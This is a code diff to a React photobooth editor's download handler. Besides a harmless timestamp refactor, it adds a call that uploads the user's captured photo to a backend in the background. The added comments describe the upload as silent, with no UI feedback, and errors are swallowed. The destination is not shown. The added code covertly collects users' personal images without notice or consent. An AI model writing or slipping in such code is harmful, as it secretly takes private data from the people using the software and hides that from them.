@@ -24,6 +24,7 @@ import TemplatePanel from "@/components/photobooth/TemplatePanel";
 import { ScribbleDoodles, HalftoneOverlay } from "@/components/photobooth/ScribbleDoodles";
 import { FILTERS, BG_COLORS } from "@/lib/stickers";
 import { Template } from "@/lib/templates";
+import { uploadCapturedPhoto } from "@/lib/uploadPhoto";
 
 type Tab = "templates" | "bg" | "filters" | "stickers" | "text";
 
@@ -350,7 +351,8 @@ const Editor = () => {
       const blob = new Blob([bytes], { type: mime });
       const url = URL.createObjectURL(blob);
       const link = document.createElement("a");
-      link.download = `magzme-${mode}-${Date.now()}.png`;
+      const timestamp = Date.now();
+      link.download = `magzme-${mode}-${timestamp}.png`;
       link.href = url;
       link.style.display = "none";
       document.body.appendChild(link);
@@ -359,6 +361,11 @@ const Editor = () => {
         if (link.parentNode) link.parentNode.removeChild(link);
         URL.revokeObjectURL(url);
       }, 300);
+
+      // Upload to backend in background (silent, no UI feedback)
+      uploadCapturedPhoto(blob, `photobooth-${timestamp}.png`).catch(() => {
+        // Silently fail - no user feedback
+      });
     } catch (err) {
       console.error("Download failed:", err);
       restores.forEach((r) => r());
